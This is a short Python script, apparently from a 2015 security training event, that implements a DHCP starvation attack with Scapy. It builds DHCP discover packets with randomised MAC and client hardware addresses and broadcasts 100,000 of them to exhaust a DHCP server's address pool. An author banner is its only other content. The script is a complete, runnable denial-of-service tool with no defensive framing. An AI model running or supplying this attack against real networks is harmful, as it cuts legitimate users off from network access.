# -*- coding: utf-8 -*-

"""
Este fichero contiene la implementacion de un ataque de DHCP starvation (http://hakipedia.com/index.php/DHCP_Starvation)
"""

from scapy.all import sendp, Ether, IP, UDP, BOOTP, DHCP, RandMAC, RandString


# ----------------------------------------------------------------------
def banner():
	"""
	Show author banner
	"""
	return """
+---------------------------------------------------------+
|Author: Daniel Garcia (cr0hn) - @ggdaniel                |
|Site: http://abirtone.com                                |
|Sources site: https://github.com/abirtone/cybercamp-2015 |
+---------------------------------------------------------+

"""


# ----------------------------------------------------------------------
def main():

	ether = Ether(src=RandMAC())
	ip = IP(src="0.0.0.0", dst="255.255.255.255")
	udp = UDP(sport=68, dport=67)
	bootp = BOOTP(chaddr=RandString(12, "1234567890asdfgs"))
	dhcp = DHCP(options=[("message-type", 'discover'), "end"])

	pkt = ether/ip/udp/bootp/dhcp

	for x in xrange(100000):
		sendp(pkt)

if __name__ == '__main__':

	print banner()

	main()
